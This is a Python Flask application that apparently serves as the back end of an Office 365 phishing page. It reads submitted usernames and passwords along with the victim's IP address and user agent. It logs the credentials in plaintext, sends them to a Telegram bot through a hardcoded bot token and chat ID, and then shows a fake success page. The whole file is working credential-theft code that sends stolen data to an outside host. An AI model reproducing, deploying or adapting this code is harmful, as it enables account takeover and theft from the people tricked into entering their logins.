from flask import Flask, request, render_template, redirect
import requests
import logging

app = Flask(__name__)

# CONFIGURATION
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def send_to_telegram(username, password, ip, ua):
    """
    Sends the captured credentials to the Telegram bot.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Format the message with HTML for Telegram
    message_text = f"""
🛡️ <b>New O365 Credential Captured</b>

👤 <b>Username:</b> {username}
🔑 <b>Password:</b> {password}

🌐 <b>Source IP:</b> {ip}
🧩 <b>User Agent:</b> {ua}
"""
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message_text,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            logger.info(f"Successfully sent credential to Telegram for user: {username}")
        else:
            logger.error(f"Telegram API error: {response.status_code} {response.text}")
    except Exception as e:
        logger.error(f"Failed to send to Telegram: {str(e)}")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # Capture form data
        username = request.form.get('login_input', '')
        password = request.form.get('passwd', '')
        
        # Capture metadata
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent', 'Unknown')
        
        # Log locally for debugging
        logger.info(f"[CAPTURE] {username} : {password} from {ip}")
        
        # Send to Telegram
        send_to_telegram(username, password, ip, ua)
        
        # Redirect to a fake success page
        return render_template("index.html", success=True, username=username)
    
    return render_template("index.html", success=False)

if __name__ == "__main__":
    # Render.com will set the PORT environment variable. 
    # Locally, it will use 5000.
    port = int(__import__('os').environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)